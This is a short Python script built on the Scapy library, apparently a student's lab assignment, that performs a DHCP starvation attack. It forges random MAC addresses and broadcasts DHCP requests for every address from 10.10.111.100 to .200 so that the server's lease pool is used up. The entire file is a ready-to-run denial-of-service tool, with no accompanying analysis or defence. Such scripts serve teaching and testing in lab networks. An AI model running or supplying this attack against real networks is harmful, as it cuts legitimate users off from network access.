## LAB 01 -- DHCP starvation attack using Python/ScaPy
##
## "When an attacker binds all usable IP addresses on a DHCP server and performs DoS on the
## network"
##
## Farhad Ahmed -- fa961@nyu.edu
## 02/19/19
##


from scapy.all import *
from time import sleep

def starve():
    # from range 10.10.111.100 to 10.10.111.200
    for j in range (100,201):
        # building IP using subnet
        requestedAddress = "10.10.111." + str(j)
        # generate new MAC address
        Source_macAddress = RandMAC()

        #assemble packet
        packet = Ether(src = Source_macAddress, dst = "ff:ff:ff:ff:ff:ff")
        packet /= IP(src = "0.0.0.0", dst = "255.255.255.255")
        packet /= UDP(sport = 68, dport = 67)
        packet /= BOOTP(chaddr = Source_macAddress)
        packet /= DHCP(options = [("message-type", "request"),
                                  ("requested_addr", requestedAddress),
                                  ("server_id", "10.10.111.1"), "end"])
        sendp(packet)
        print("Occupying " + requestedAddress)
        # sleep to avoid congestion
        sleep(0.3)


if __name__ == "__main__":
    starve()
